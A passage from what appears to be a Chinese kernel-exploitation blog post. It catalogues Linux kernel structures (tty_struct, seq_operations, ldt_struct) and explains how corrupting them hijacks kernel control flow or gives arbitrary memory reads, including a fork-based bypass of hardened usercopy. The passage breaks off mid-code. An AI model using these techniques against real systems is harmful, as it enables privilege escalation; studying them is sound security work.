stopped;</span><br><span class="line">        <span class="type">bool</span> tco_stopped;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) flow;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> pktstatus;</span><br><span class="line">        <span class="type">bool</span> packet;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) ctrl;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;    <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;        <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Each of a tty&#x27;s open files has private_data pointing to tty_file_private */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* tty magic number */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_MAGIC        0x5401</span></span><br></pre></td></tr></table></figure><p><code>tty_struct</code>中ops对应的<code>tty_operations</code>结构体,定义于<code>/include/linux/tty_driver.h</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*write_room)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*chars_in_buffer)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">int</span>  (*get_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">int</span>  (*set_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h2 id="seq-operations"><a href="#seq-operations" class="headerlink" title="seq_operations"></a>seq_operations</h2><p><strong>申请obj大小:32</strong></p><p><strong>GFP_KERNEL_ACCOUNT:是</strong></p><p><strong>功能:.text泄露|劫持流</strong></p><p>当打开<code>/proc/id/stat</code>文件时,会分配一个<code>seq_operations</code>结构体,定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>只包含四个函数指针,显然可以用来劫持执行流和泄露地址</p><p>一般选择打开<code>/proc/self/stat</code>来<strong>分配</strong>该结构体,同样关闭即可<strong>释放</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>);<span class="comment">//分配</span></span><br><span class="line">close(fd);<span class="comment">//释放</span></span><br></pre></td></tr></table></figure><p>当我们 read 一个 stat 文件时，内核会调用其 proc_ops 的 <code>proc_read_iter</code> 指针，其默认值为 <code>seq_read_iter()</code> 函数，定义于 <code>fs/seq_file.c</code> 中，注意到有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *iter)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>即其会调用 seq_operations 中的 start 函数指针，那么<strong>我们只需要控制 seq_operations-&gt;start 后再读取对应 stat 文件便能控制内核执行流</strong></p><h2 id="ldt-struct"><a href="#ldt-struct" class="headerlink" title="ldt_struct"></a>ldt_struct</h2><p><strong>申请obj大小:32[slab]||16[slub]</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:任意读|任意写</strong></p><p>ldt 即<strong>局部段描述符表</strong>(<strong>Local Descriptor Table</strong>)，其中存放着<strong>进程的</strong>段描述符，段寄存器当中存放着的段选择子便是段描述符表中段描述符的索引</p><p>定义如下(<code>/arch/x86/include/asm/mmu_context.h</code>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ldt_structs can be allocated, used, and freed, but they are never</span></span><br><span class="line"><span class="comment"> * modified while live.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment"> * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment"> * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment"> * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>*<span class="title">entries</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>nr_entries;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment"> * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment"> * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment"> * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment"> * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>结构体大小是<code>0x10</code>,slub中会在<code>kmalloc-16</code>申请,slab则会在<code>kmalloc-32</code>申请</p><p>entries指向一个数组</p><p>nr_entries记录着数组的数量</p><p><code>struct desc_struct</code>即使段描述符,定义如下(<code>/arch/x86/include/asm/desc_defs.h</code>),暂时不管他</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 8 byte segment descriptor */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">u16limit0;</span><br><span class="line">u16base0;</span><br><span class="line">u16base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">u16limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><p>Linux 提供 <code>modify_ldt</code> 系统调用，通过该系统调用可以<strong>获取或修改当前进程的 LDT</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (func) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">ret = read_ldt(ptr, bytecount);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">ret = read_default_ldt(ptr, bytecount);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment"> * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment"> * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment"> * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment"> * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment"> * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment"> * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="read-ldt"><a href="#read-ldt" class="headerlink" title="read_ldt"></a>read_ldt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> entries_size;</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">down_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mm-&gt;context.ldt) &#123;</span><br><span class="line">retval = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bytecount &gt; LDT_ENTRY_SIZE * LDT_ENTRIES)</span><br><span class="line">bytecount = LDT_ENTRY_SIZE * LDT_ENTRIES;</span><br><span class="line"></span><br><span class="line">entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line"><span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">entries_size = bytecount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (entries_size != bytecount) &#123;</span><br><span class="line"><span class="comment">/* Zero-fill the rest and pretend we read bytecount bytes. */</span></span><br><span class="line"><span class="keyword">if</span> (clear_user(ptr + entries_size, bytecount - entries_size)) &#123;</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">retval = bytecount;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中两个常量宏的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRIES8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRY_SIZE8</span></span><br></pre></td></tr></table></figure><p>重点看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们能够修改ldt结构的entries结构,便能够做到任意读</p><p>并且copy_from_user和copy_to_user的返回值均是未成功copy的数量,可以以此判断是否命中</p><h4 id="大范围搜索内存"><a href="#大范围搜索内存" class="headerlink" title="大范围搜索内存"></a>大范围搜索内存</h4><p>不过就算read_ldt能够帮助我们搜索内存,但是仍然无法完全避免<code>hardened usercopy</code>的影响</p><p>但观察 fork 系统调用的源码，我们可以发现如下执行链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys_fork()</span><br><span class="line">    kernel_clone()</span><br><span class="line">        copy_process()</span><br><span class="line">            copy_mm()</span><br><span class="line">                dup_mm()</span><br><span class="line">                    dup_mmap()</span><br><span class="line">                        arch_dup_mmap()</span><br><span class="line">                            ldt_dup_context()</span><br></pre></td></tr></table></figure><p>ldt_dup_context() 定义于 <code>arch/x86/kernel/ldt.c</code> 中，逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>new_ldt-&gt;nr_entries</code>由<code>old_ldt-&gt;nr_entries</code>赋值</p><p>在这里会通过 memcpy 将父进程的 ldt-&gt;entries 拷贝给子进程，<strong>是完全处在内核中的操作</strong>,因此能够绕过<code>hardened usercopy</code>的检查</p><p>当父进程设置目标地址后,再打开子进程,便会将目标地址处的内容复制到子进程的ldt中,之后再使用read_ldt便能够直接读取</p><h3 id="write-ldt"><a href="#write-ldt" class="headerlink" title="write_ldt"></a>write_ldt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> old_nr_entries, new_nr_entries;</span><br><span 